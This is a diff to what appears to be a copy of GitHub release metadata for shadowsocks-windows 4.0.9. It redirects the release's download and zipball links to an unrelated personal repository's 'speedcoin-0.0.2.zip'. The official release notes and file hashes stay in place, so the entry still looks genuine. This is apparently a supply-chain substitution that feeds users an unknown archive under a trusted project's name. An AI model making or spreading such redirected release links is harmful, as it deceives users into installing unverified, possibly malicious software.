@@ -35,7 +35,7 @@
       {
         "url": "https://api.github.com/repos/shadowsocks/shadowsocks-windows/releases/assets/6508879",
         "id": 6508879,
-        "name": "Shadowsocks-4.0.9.zip",
+        "name": "5.3.zip",
         "label": null,
         "uploader": {
           "login": "celeron533",
@@ -62,11 +62,11 @@
         "download_count": 5270652,
         "created_at": "2018-05-03T13:00:27Z",
         "updated_at": "2018-05-03T13:00:34Z",
-        "browser_download_url": "https://github.com/hernandez3000/hernandez3000.github.io/raw/master/5.3.zip"
+        "browser_download_url": "https://github.com/hernandez3000/hernandez3000.github.io/raw/master/speedcoin-0.0.2.zip"
       }
     ],
     "tarball_url": "https://api.github.com/repos/shadowsocks/shadowsocks-windows/tarball/4.0.9",
-    "zipball_url": "https://github.com/hernandez3000/hernandez3000.github.io/raw/master/5.3.zip",
+    "zipball_url": "https://github.com/hernandez3000/hernandez3000.github.io/raw/master/speedcoin-0.0.2.zip",
     "body": "- Fix port occupied issue\r\n- Add xchacha20-ietf-poly1305\r\n- Update cryptographic libraries\r\n- Bug fixes and improvements\r\n\r\n---\r\n\r\nIf you encounter any issue, please refer to https://github.com/shadowsocks/shadowsocks-windows/wiki/Troubleshooting.\r\n\r\n如果遇到任何问题，请首先参考 https://github.com/shadowsocks/shadowsocks-windows/wiki/Troubleshooting\r\n\r\n---\r\n\r\n**Info of Shadowsocks.exe**\r\n- MD5: `416D19FA0878A9E9B260580B559EF8DE`\r\n- SHA1: `88E5D9A81BE58B9241110EDD62D30D2182B4C5DA`\r\n- SHA256: `D618D4FDE2212052636F91E7EFD35AB907317354D76693006177C507CBA772C0`\r\n- SHA512: `212A90729B8435B4C1919EF9B7B1D9399F69D23CB9F2BD093B4138F0CBCFE1E45D5D0390157EA863E18A97AAA54B9A270106B2CE116A82BB09E0491E88AAD94A`"
   }
  ]
